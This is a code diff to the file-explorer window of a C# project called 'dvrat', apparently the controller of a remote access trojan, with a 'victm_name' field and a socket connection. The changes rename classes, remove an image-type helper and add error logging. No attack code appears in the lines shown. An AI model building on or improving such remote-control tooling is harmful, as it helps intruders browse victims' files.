@@ -17,17 +17,17 @@ using Microsoft.VisualBasic;
 using dvrat.modules;
 namespace dvrat
 {
-    public partial class file_explorer_form : Form
+    public partial class FileExplorer : Form
     {
         public string[] _MAIN_DISKS;
         public string victm_name = "";
         string last_folder = "";
         string _MAIN_DIR = "";
         Socket _s;
-        Form1 _parent;
+        MainForm _parent;
         rename_dialog rnm_frm;
         int selected_list = 0;
-        public file_explorer_form(Socket s, Form1 parent,string main_dir)
+        public FileExplorer(Socket s, MainForm parent,string main_dir)
         {
             this._MAIN_DIR = main_dir;
             this._s = s;
@@ -53,28 +53,7 @@ namespace dvrat
             }));
         }
 
-        public static bool IsRecognisedImageFile(string fileName)
-        {
-            string targetExtension = System.IO.Path.GetExtension(fileName);
-            if (String.IsNullOrEmpty(targetExtension))
-                return false;
-            else
-                targetExtension = "*" + targetExtension.ToLowerInvariant();
-
-            List<string> recognisedImageExtensions = new List<string>();
-
-            foreach (System.Drawing.Imaging.ImageCodecInfo imageCodec in System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders())
-                recognisedImageExtensions.AddRange(imageCodec.FilenameExtension.ToLowerInvariant().Split(";".ToCharArray()));
-
-            foreach (string extension in recognisedImageExtensions)
-            {
-                if (extension.Equals(targetExtension))
-                {
-                    return true;
-                }
-            }
-            return false;
-        }
+ 
 
 
       
@@ -138,7 +117,7 @@ namespace dvrat
                         }
                         catch (Exception ex)
                         {
-                            //just pass
+                            _parent.error_log_file(ex.ToString());
                         }
                         try
                         {
@@ -149,6 +128,8 @@ namespace dvrat
                         catch (Exception ex)
                         {
                             row1.ImageIndex = 0;
+                            _parent.error_log_file(ex.ToString());
+
                         }
                         listView1.Items.Add(row1);
 
@@ -224,9 +205,11 @@ namespace dvrat
                             }
                             catch (Exception ex)
                             {
-                                //just pass
-                            }
-                            try
+                            //just pass
+                            _parent.error_log_file(ex.ToString());
+
+                        }
+                        try
                             {
                                 Icon ico = System.Drawing.Icon.ExtractAssociatedIcon(withexttemp);
                                 imageList1.Images.Add(ico);
@@ -235,8 +218,10 @@ namespace dvrat
                             catch (Exception ex)
                             {
                                 row1.ImageIndex = 0;
-                            }
-                            listView2.Items.Add(row1);
+                            _parent.error_log_file(ex.ToString());
+
+                        }
+                        listView2.Items.Add(row1);
                             listView2.Refresh();
                         
                         }
